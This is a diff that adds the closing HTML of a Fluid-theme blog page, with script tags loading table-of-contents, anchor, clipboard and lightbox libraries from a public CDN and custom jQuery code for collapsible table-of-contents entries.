+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/click-effect.js"></script>
+<script src="/js/progress.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
